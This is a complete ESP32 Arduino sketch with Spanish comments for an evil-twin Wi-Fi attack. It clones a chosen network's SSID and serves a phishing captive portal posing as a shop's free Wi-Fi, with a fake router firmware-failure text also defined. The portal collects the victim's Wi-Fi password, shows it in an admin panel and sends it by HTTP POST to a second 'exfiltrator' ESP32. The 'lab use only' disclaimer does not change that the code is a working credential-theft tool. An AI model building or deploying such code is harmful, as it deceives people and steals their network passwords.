// ============================================================
//  ESP32 #1 - Evil Twin / Captive Portal
//by JRXsec & joaks07
//  Proyecto educativo - Solo uso en laboratorio autorizado
//  Entorno controlado - No usar en redes ajenas sin permiso
// ============================================================


// ------------------------------------------------------------
// Librerias
// ------------------------------------------------------------
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <HTTPClient.h>
#include "esp_wifi.h"

// ------------------------------------------------------------
// Estructuras de datos (antes de defines para compatibilidad
// con el preprocesador de Arduino IDE)
// ------------------------------------------------------------
typedef struct {
  String  ssid;
  uint8_t bssid[6];
  uint8_t channel;
  int32_t rssi;
} ScanResult;

struct Attempt {
  String password;
  bool   correct;
  String timestamp;
};

#include <functional>


// ------------------------------------------------------------
// Configuracion del panel de administracion
// >>> CAMBIA ESTAS CREDENCIALES ANTES DE USAR <<<
// ------------------------------------------------------------
#define ADMIN_USER       "admin"
#define ADMIN_PASS       "change_me"
#define ADMIN_AP_SSID    "EvilTwin-Admin"
#define ADMIN_AP_PASS    "change_me_too"


// ------------------------------------------------------------
// Configuracion del portal (lo que ve la victima)
// ------------------------------------------------------------
#define PORTAL_SUBTITLE  "ACCESS POINT RESCUE MODE"
#define PORTAL_TITLE     "Firmware Update Failed"
#define PORTAL_BODY      "Your router encountered a problem while automatically installing the latest firmware update. To revert the old firmware and manually update later, please verify your WiFi password."


// ------------------------------------------------------------
// Configuracion del ESP32 exfiltrador (#2)
// >>> DEBE COINCIDIR CON LA CONFIG DEL ESP32 #2 <<<
// ------------------------------------------------------------
#define EXFIL_AP_SSID   "Livebox"
#define EXFIL_AP_PASS   "tryharder"
#define EXFIL_ENDPOINT  "http://192.168.10.1/recv"


// ------------------------------------------------------------
// Constantes generales
// ------------------------------------------------------------
#define LED_PIN          2
#define MAX_NETWORKS     32
#define SCAN_INTERVAL    15000
#define WIFI_CHECK_MS    2000
#define MAX_WHITELIST    10


// ------------------------------------------------------------
// Whitelist MAC - agrega aqui las MACs de tus dispositivos
// Si whitelistCount = 0, se permite cualquier MAC
// ------------------------------------------------------------
const char* MAC_WHITELIST[MAX_WHITELIST] = {
  // "aa:bb:cc:dd:ee:f1",   // Ejemplo: tu movil
  // "aa:bb:cc:dd:ee:f2",   // Ejemplo: tu portatil
};
const int whitelistCount = 0;


// ------------------------------------------------------------
// Variables globales
// ------------------------------------------------------------
const byte  DNS_PORT = 53;
IPAddress   apIP(192, 168, 4, 1);
DNSServer   dnsServer;
WebServer   webServer(80);

ScanResult  networks[MAX_NETWORKS];
int      networkCount    = 0;
ScanResult  selectedScanResult;
bool     networkSelected = false;
bool     hotspotActive   = false;
bool     deauthActive    = false;

Attempt  attempts[50];
int      attemptCount       = 0;
String   capturedCredential = "";

bool          pendingExfil = false;
unsigned long exfilTimer   = 0;

unsigned long lastScan     = 0;
unsigned long lastWifiChk  = 0;
unsigned long lastLedBlink = 0;
bool          ledState     = false;


// ------------------------------------------------------------
// Prototipos
// ------------------------------------------------------------
void   performScan();
void   clearScanResults();
String bytesToStr(const uint8_t* b, uint32_t size);
bool   isMacAllowed(const String& mac);
String getClientMac();
void   startEvilTwin();
void   stopEvilTwin();
void   restartEvilTwin();
void   updateLED();
void   logAttempt(const String& pwd);
void   sendToExfil(const String& ssid, const String& pwd);
String pageHeader(const String& title);
String pageFooter();
String portalIndex();
String blockedPage();
String buildAdminPanel();
void   handleAdmin();
void   handlePortal();
void   handleRescan();
void   handleNotFound();


// ============================================================
// SETUP
// ============================================================
void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  Serial.println("[EvilTwin] Iniciando ESP32 #1...");

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ADMIN_AP_SSID, ADMIN_AP_PASS);

  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/",       handlePortal);
  webServer.on("/admin",  handleAdmin);
  webServer.on("/rescan", handleRescan);
  webServer.onNotFound(handleNotFound);
  webServer.begin();

  performScan();
  Serial.println("[EvilTwin] Sistema listo.");
}


// ============================================================
// LOOP
// ============================================================
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  updateLED();

  if (pendingExfil && millis() - exfilTimer >= 1500) {
    pendingExfil = false;
    Serial.println("[Loop] Iniciando exfiltracion...");
    stopEvilTwin();
    delay(300);

    WiFi.mode(WIFI_STA);
    delay(200);
    sendToExfil(selectedScanResult.ssid, capturedCredential);

    WiFi.disconnect(true);
    delay(300);
    WiFi.mode(WIFI_AP_STA);
    delay(200);

    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(selectedScanResult.ssid.c_str());
    dnsServer.start(DNS_PORT, "*", apIP);
    hotspotActive = true;
    Serial.printf("[Loop] Evil Twin reactivado como: %s\n", selectedScanResult.ssid.c_str());
  }

  if (!hotspotActive && !pendingExfil && millis() - lastScan >= SCAN_INTERVAL) {
    performScan();
    lastScan = millis();
  }
}


// ============================================================
// ESCANEO DE REDES
// ============================================================
void performScan() {
  Serial.println("[Scan] Escaneando redes...");
  int n = WiFi.scanNetworks();
  clearScanResults();
  if (n <= 0) { Serial.println("[Scan] Sin redes."); return; }
  networkCount = (n < MAX_NETWORKS) ? n : MAX_NETWORKS;
  for (int i = 0; i < networkCount; i++) {
    networks[i].ssid    = WiFi.SSID(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].rssi    = WiFi.RSSI(i);
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
  }
  for (int i = 0; i < networkCount - 1; i++) {
    for (int j = 0; j < networkCount - i - 1; j++) {
      if (networks[j].rssi < networks[j+1].rssi) {
        auto tmp       = networks[j];
        networks[j]   = networks[j+1];
        networks[j+1] = tmp;
      }
    }
  }
  Serial.printf("[Scan] %d redes encontradas.\n", networkCount);
}

void clearScanResults() {
  networkCount = 0;
  for (int i = 0; i < MAX_NETWORKS; i++) networks[i].ssid = "";
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}


// ============================================================
// WHITELIST MAC
// ============================================================
bool isMacAllowed(const String& mac) {
  if (whitelistCount == 0) return true;
  String macLow = mac;
  macLow.toLowerCase();
  for (int i = 0; i < whitelistCount; i++) {
    if (macLow == String(MAC_WHITELIST[i])) return true;
  }
  return false;
}

String getClientMac() {
  wifi_sta_list_t stationList;
  memset(&stationList, 0, sizeof(stationList));
  esp_wifi_ap_get_sta_list(&stationList);

  if (stationList.num == 1) {
    return bytesToStr(stationList.sta[0].mac, 6);
  }

  IPAddress clientIP = webServer.client().remoteIP();
  for (int i = 0; i < stationList.num; i++) {
    return bytesToStr(stationList.sta[i].mac, 6);
  }

  Serial.printf("[MAC] No se pudo determinar MAC para IP: %s\n", clientIP.toString().c_str());
  return "";
}

String blockedPage() {
  return "<!DOCTYPE html><html><head>"
         "<meta charset='UTF-8'>"
         "<meta name='viewport' content='width=device-width,initial-scale=1'>"
         "<title>Sin conexion</title>"
         "<style>body{font-family:Arial,sans-serif;text-align:center;padding:3em;color:#555;}"
         "h2{font-size:5vw;color:#999;}</style>"
         "</head><body>"
         "<h2>Sin acceso a internet</h2>"
         "<p>Esta red no tiene conexion en este momento.</p>"
         "</body></html>";
}


// ============================================================
// CONTROL DEL ATAQUE
// ============================================================
void startEvilTwin() {
  if (!networkSelected) return;
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(200);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(selectedScanResult.ssid.c_str());
  dnsServer.start(DNS_PORT, "*", apIP);
  hotspotActive = true;
  Serial.printf("[EvilTwin] AP activo como: %s\n", selectedScanResult.ssid.c_str());
}

void stopEvilTwin() {
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(200);
  hotspotActive = false;
  deauthActive  = false;
  Serial.println("[EvilTwin] AP desactivado. Radio libre.");
}

void restartEvilTwin() {
  sendToExfil(selectedScanResult.ssid, capturedCredential);
  delay(500);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(selectedScanResult.ssid.c_str());
  dnsServer.start(DNS_PORT, "*", apIP);
  hotspotActive = true;
  Serial.printf("[EvilTwin] Reactivado como: %s\n", selectedScanResult.ssid.c_str());
}

void updateLED() {
  if (capturedCredential != "" && attemptCount > 0) { digitalWrite(LED_PIN, HIGH); return; }
  unsigned long interval = 0;
  if (hotspotActive)     interval = 200;
  else if (deauthActive) interval = 1000;
  if (interval > 0 && millis() - lastLedBlink >= interval) {
    ledState = !ledState;
    digitalWrite(LED_PIN, ledState);
    lastLedBlink = millis();
  } else if (interval == 0) {
    digitalWrite(LED_PIN, LOW);
  }
}

void logAttempt(const String& pwd) {
  if (attemptCount >= 50) return;
  attempts[attemptCount].password  = pwd;
  attempts[attemptCount].correct   = true;
  attempts[attemptCount].timestamp = String(millis() / 1000) + "s";
  attemptCount++;
  Serial.printf("[Log] Intento #%d | pwd: %s\n", attemptCount, pwd.c_str());
}


// ============================================================
// EXFILTRACION - WiFi al ESP32 #2
// ============================================================
void sendToExfil(const String& ssid, const String& pwd) {
  Serial.printf("[Exfil] Conectando a '%s'...\n", EXFIL_AP_SSID);

  WiFi.begin(EXFIL_AP_SSID, EXFIL_AP_PASS);

  unsigned long t = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - t < 12000) {
    delay(250);
    Serial.print(".");
  }
  Serial.println();

  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("[Exfil] No se pudo conectar al ESP32 #2.");
    return;
  }

  Serial.printf("[Exfil] Conectado a %s. Enviando...\n", EXFIL_AP_SSID);

  HTTPClient http;
  http.begin(EXFIL_ENDPOINT);
  http.addHeader("Content-Type", "application/x-www-form-urlencoded");
  http.setTimeout(5000);

  String body = "ssid=" + ssid + "&password=" + pwd;
  int code = http.POST(body);

  if (code == 200) {
    Serial.printf("[Exfil] Enviado OK (HTTP %d)\n", code);
  } else {
    Serial.printf("[Exfil] Error HTTP: %d\n", code);
  }
  http.end();
}


// ============================================================
// GENERACION HTML - Portal cautivo "MacRoña"
// ============================================================
String pageHeader(const String& title) {
  return "<!DOCTYPE html><html><head>"
         "<meta charset='UTF-8'>"
         "<meta name='viewport' content='width=device-width,initial-scale=1'>"
         "<title>" + title + "</title></head><body>";
}

String pageFooter() {
  return "</body></html>";
}

String portalIndex() {
  String ssid = networkSelected ? selectedScanResult.ssid : "WiFi_Gratuito";
  String css =
    "body{margin:0;padding:0;font-family:Arial,sans-serif;background:#fff;}"
    ".logo-bar{background:#8B4513;padding:18px 0 10px;text-align:center;}"
    ".logo{font-size:72px;color:#CDAA7D;line-height:1;font-weight:900;font-family:Impact,Arial Black,sans-serif;}"
    ".tagline{background:#CDAA7D;color:#8B4513;font-size:13px;font-weight:700;padding:6px 0;letter-spacing:2px;text-transform:uppercase;text-align:center;}"
    ".banner{background:#fff;border-bottom:3px solid #CDAA7D;padding:18px 20px 14px;text-align:center;}"
    ".banner h2{margin:0 0 6px;font-size:18px;color:#8B4513;font-weight:700;}"
    ".banner p{margin:0;font-size:13px;color:#333;line-height:1.5;}"
    ".alert{background:#FFF8E1;border-left:4px solid #CDAA7D;margin:14px 20px 0;padding:10px 12px;border-radius:0 6px 6px 0;font-size:13px;color:#5a4000;}"
    ".form-wrap{padding:20px 20px 10px;}"
    ".lbl{display:block;font-size:13px;color:#555;font-weight:700;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px;}"
    "input[type=password]{width:100%;box-sizing:border-box;padding:12px 14px;border:2px solid #ddd;border-radius:6px;font-size:15px;}"
    "input[type=submit]{display:block;width:100%;margin-top:14px;padding:14px;background:#CDAA7D;color:#8B4513;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase;}"
    "hr{border:none;border-top:1px solid #eee;margin:16px 0;}"
    ".info{font-size:12px;color:#888;text-align:center;padding:0 20px 6px;line-height:1.6;}"
    ".info span{color:#8B4513;font-weight:700;}"
    ".footer{background:#8B4513;color:#CDAA7D;text-align:center;font-size:11px;padding:10px;}";

  return "<!DOCTYPE html><html><head>"
         "<meta charset='UTF-8'>"
         "<meta name='viewport' content='width=device-width,initial-scale=1'>"
         "<title>" + ssid + " - WiFi Gratuito</title>"
         "<style>" + css + "</style></head><body>"
         "<div class='logo-bar'><div class='logo'>MR</div></div>"
         "<div class='tagline'>MacRo&ntilde;a WiFi Gratuito</div>"
         "<div class='banner'>"
         "<h2>Bienvenido al WiFi de MacRo&ntilde;a</h2>"
         "<p>Para seguir disfrutando de internet gratuito,<br>verifica tus credenciales de red.</p>"
         "</div>"
         "<div class='alert'>Tu sesion ha caducado. Vuelve a introducir la contrasenna WiFi para reconectarte.</div>"
         "<div class='form-wrap'>"
         "<form action='/' method='post'>"
         "<label class='lbl'>Contrasenna WiFi</label>"
         "<input type='password' name='password' placeholder='Introduce la contrasenna' minlength='4' required>"
         "<input type='submit' value='Conectar Ahora'>"
         "</form></div>"
         "<hr>"
         "<p class='info'>Al conectarte, aceptas los<br>"
         "<span>Terminos de Uso y Politica de Privacidad</span> de MacRo&ntilde;a</p>"
         "<div class='footer'>&copy; MacRo&ntilde;a Corp. &mdash; WiFi Gratuito para Clientes</div>"
         "</body></html>";
}


// ============================================================
// GENERACION HTML - Panel admin
// ============================================================
String buildAdminPanel() {
  String dis = networkSelected ? "" : " disabled";
  String html =
    "<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>EvilTwin - Panel</title>"
    "<style>"
    "body{font-family:Arial,sans-serif;background:#1a1a2e;color:#eee;margin:0;padding:0;}"
    "h1{background:#16213e;padding:1em;margin:0;color:#00d4ff;font-size:1.3em;}"
    "h1 small{font-size:0.7em;color:#aaa;display:block;margin-top:4px;}"
    ".panel{max-width:960px;margin:auto;padding:1em;}"
    ".card{background:#16213e;border-radius:8px;padding:1em;margin-bottom:1em;}"
    ".card h2{margin:0 0 0.5em;color:#00d4ff;font-size:1em;text-transform:uppercase;}"
    "table{width:100%;border-collapse:collapse;font-size:0.9em;}"
    "th{background:#0f3460;color:#00d4ff;padding:8px;text-align:left;}"
    "td{padding:7px 8px;border-bottom:1px solid #333;}"
    ".btn{padding:8px 16px;border:none;border-radius:5px;cursor:pointer;font-weight:bold;margin:3px;}"
    ".btn-red{background:#c0392b;color:#fff;}"
    ".btn-green{background:#27ae60;color:#fff;}"
    ".btn-blue{background:#2980b9;color:#fff;}"
    ".btn-sel{background:#2ecc71;color:#000;}"
    ".pwd{font-family:monospace;color:#2ecc71;font-weight:bold;}"
    "</style></head><body>"
    "<h1>EvilTwin - Panel de Control"
    "<small>Entorno controlado - Solo uso educativo</small></h1>"
    "<div class='panel'>";

  html += "<div class='card'><h2>Estado</h2><p>";
  html += "Evil Twin: <b>" + String(hotspotActive ? "ACTIVO" : "Inactivo") + "</b> &nbsp;|&nbsp; ";
  html += "Redes: <b>" + String(networkCount) + "</b> &nbsp;|&nbsp; ";
  html += "Credenciales capturadas: <b style='color:#2ecc71'>" + String(attemptCount) + "</b></p>";
  if (networkSelected) {
    html += "<p>Red: <b>" + selectedScanResult.ssid + "</b> | Ch " + String(selectedScanResult.channel) + " | " + String(selectedScanResult.rssi) + " dBm</p>";
  }
  html += "</div>";

  html += "<div class='card'><h2>Control</h2>";
  if (hotspotActive) {
    html += "<form style='display:inline' method='post' action='/admin?hotspot=stop'>"
            "<button class='btn btn-red'>Parar Evil Twin</button></form>";
  } else {
    html += "<form style='display:inline' method='post' action='/admin?hotspot=start'>"
            "<button class='btn btn-green'" + dis + ">Iniciar Evil Twin</button></form>";
  }
  html += "<form style='display:inline' method='post' action='/rescan'>"
          "<button class='btn btn-blue'>Re-escanear</button></form>";
  html += "</div>";

  html += "<div class='card'><h2>Redes Detectadas</h2>";
  if (networkCount == 0) {
    html += "<p>Sin redes. Pulsa Re-escanear.</p>";
  } else {
    html += "<table><tr><th>#</th><th>SSID</th><th>BSSID</th><th>Canal</th><th>RSSI</th><th>Accion</th></tr>";
    for (int i = 0; i < networkCount; i++) {
      String bssid = bytesToStr(networks[i].bssid, 6);
      bool isSel = networkSelected && bytesToStr(selectedScanResult.bssid, 6) == bssid;
      html += "<tr><td>" + String(i+1) + "</td><td>" + networks[i].ssid + "</td>";
      html += "<td><small>" + bssid + "</small></td>";
      html += "<td>" + String(networks[i].channel) + "</td>";
      html += "<td>" + String(networks[i].rssi) + " dBm</td>";
      html += "<td><form method='post' action='/admin?ap=" + bssid + "'>";
      html += "<button class='btn " + String(isSel ? "btn-sel'>Seleccionada" : "btn-blue'>Seleccionar") + "</button></form></td></tr>";
    }
    html += "</table>";
  }
  html += "</div>";

  if (attemptCount > 0) {
    html += "<div class='card'><h2>Credenciales Capturadas</h2>";
    html += "<table><tr><th>#</th><th>SSID</th><th>Contrasenna</th><th>Tiempo</th></tr>";
    for (int i = attemptCount - 1; i >= 0; i--) {
      html += "<tr><td>" + String(i+1) + "</td>"
              "<td>" + selectedScanResult.ssid + "</td>"
              "<td><span class='pwd'>" + attempts[i].password + "</span></td>"
              "<td>" + attempts[i].timestamp + "</td></tr>";
    }
    html += "</table></div>";
  }

  html += "</div></body></html>";
  return html;
}


// ============================================================
// MANEJADORES HTTP
// ============================================================

void handleRescan() {
  performScan();
  webServer.sendHeader("Location", "/admin");
  webServer.send(303);
}

void handleAdmin() {
  if (!webServer.authenticate(ADMIN_USER, ADMIN_PASS)) {
    return webServer.requestAuthentication();
  }

  if (webServer.hasArg("ap")) {
    String target = webServer.arg("ap");
    for (int i = 0; i < networkCount; i++) {
      if (bytesToStr(networks[i].bssid, 6) == target) {
        selectedScanResult = networks[i];
        networkSelected = true;
        break;
      }
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") startEvilTwin();
    else stopEvilTwin();
    webServer.sendHeader("Location", "/admin");
    webServer.send(303);
    return;
  }

  webServer.send(200, "text/html", buildAdminPanel());
}

void handlePortal() {
  if (!hotspotActive) {
    webServer.sendHeader("Location", "/admin");
    webServer.send(303);
    return;
  }

  String clientMac = getClientMac();
  if (!isMacAllowed(clientMac)) {
    Serial.printf("[MAC] Bloqueado: %s\n", clientMac.c_str());
    webServer.send(200, "text/html", blockedPage());
    return;
  }

  if (webServer.hasArg("password")) {
    String pwd = webServer.arg("password");
    Serial.printf("[Portal] Contrasenna recibida: %s\n", pwd.c_str());

    capturedCredential = pwd;
    logAttempt(pwd);

    webServer.send(200, "text/html",
      "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'></head>"
      "<body style='font-family:Arial;text-align:center;padding:2em;background:#fff;'>"
      "<div style='background:#8B4513;padding:18px 0;text-align:center;'>"
      "<span style='font-size:60px;color:#CDAA7D;font-weight:900;font-family:Impact;'>MR</span></div>"
      "<h2 style='color:#27ae60;font-size:6vw;margin-top:1em;'>Conexion Restaurada</h2>"
      "<p style='color:#555;'>Tu router ha sido actualizado correctamente.<br>"
      "Vuelve a conectarte a tu red WiFi.</p>"
      "</body></html>");

    pendingExfil = true;
    exfilTimer = millis();

  } else {
    webServer.send(200, "text/html", portalIndex());
  }
}

void handleNotFound() {
  if (hotspotActive) {
    webServer.sendHeader("Location", "http://192.168.4.1/");
    webServer.send(302);
  } else {
    webServer.sendHeader("Location", "/admin");
    webServer.send(302);
  }
}
